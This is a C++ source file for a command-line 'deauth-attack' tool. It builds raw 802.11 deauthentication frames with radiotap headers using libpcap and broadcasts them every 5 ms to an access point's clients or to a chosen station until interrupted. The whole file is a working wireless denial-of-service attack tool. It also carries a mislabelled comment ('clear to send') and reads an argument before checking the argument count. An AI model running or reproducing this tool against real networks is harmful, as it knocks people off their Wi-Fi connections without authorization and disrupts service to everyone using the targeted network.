#include <iostream>
#include <cstdio>
#include <cstdint>
#include <utility>
#include <map>
#include <string>
#include <ctype.h>
#include <signal.h>
#include <pcap.h>
#include <unistd.h>

#include "mac.h"

#pragma pack(push,1)
typedef struct radiotapHdr
{
    uint8_t vision; //make vision to 0
    uint8_t pad;
    uint16_t len; // header length (entire length)
    uint32_t present; //field
}rtHdr;
#pragma pack(pop)

#pragma pack(push,1)
typedef struct beaconHdr
{
    uint8_t version : 2;
    uint8_t type : 2;
    uint8_t subtype : 4;
    uint8_t flags;
    uint16_t duration;
    Mac dst;
    Mac src;
    Mac bssid;
    uint16_t seq;
}bHdr;
#pragma pack(pop)

#pragma pack(push,1)
typedef struct fixed_parameter
{
    uint64_t timestamp;
    uint16_t beacon_interval;
    uint16_t capabilities;
}fP;
#pragma pack(pop)

#pragma pack(push,1)
typedef struct deauthHdr
{
    rtHdr radiotap;
    uint8_t pad[3];
    bHdr beacon;
    uint16_t  reason;
}dH;
#pragma pack(pop)

bool check = true;

using std::string;
using std::map; // pair object //map<key,value>
using std::pair; // tie two objects to be treated as one object // pair<t1,t2>

void usage()
{
    printf("syntax : deauth-attack <interface> <ap mac> [<station mac>]\n");
    printf("sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB\n");
}

void checksigint(int signo)
{
    check = false;
    putchar('\n');
}

void trigger(pcap_t* handle, dH& pkt)
{
    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pkt), sizeof(dH));
    if (res != 0) 
    	fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
}

int deauth(char* dev, Mac& mac_ap, Mac& mac_station)
{
    signal(SIGINT, checksigint);

    char errbuf[PCAP_ERRBUF_SIZE];
    dH dH_pac;
    
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 100, errbuf);
    if (handle == NULL)
    {
        fprintf(stderr, "deauth return error %s(%s)\n", dev, errbuf);
        return -1;
    }

    dH_pac.radiotap.vision = dH_pac.radiotap.pad = 0;
    dH_pac.radiotap.len = 0xb;
    dH_pac.radiotap.present = 0x00028000;

    dH_pac.pad[0] = 0;
    dH_pac.pad[1] = 0;
    dH_pac.pad[2] = 0;

    dH_pac.beacon.version = 0;
    dH_pac.beacon.type = 0;
    dH_pac.beacon.flags = 0;
    dH_pac.beacon.subtype = 0xc; // clear to send
    dH_pac.beacon.duration = 314;
    dH_pac.beacon.dst = mac_station;
    dH_pac.beacon.src = mac_ap;
    dH_pac.beacon.bssid = mac_ap;
    dH_pac.beacon.seq = 0;
    dH_pac.reason = 7;

    while (check)
    {
        trigger(handle, dH_pac);
        usleep(5000);
    }
    pcap_close(handle);
    return 0;
}


int main(int argc, char* argv[])
{
    Mac mac_ap, mac_station;
    mac_ap = Mac(argv[2]);
    
    if (argc != 3 && argc != 4)
    {
        printf("argc : %d\n", argc);
        usage();
        return -1;
    }

    if (argc == 4)
        mac_station = Mac(argv[3]);
    else
        mac_station = Mac::broadcastMac();

    return deauth(argv[1], mac_ap, mac_station);
}
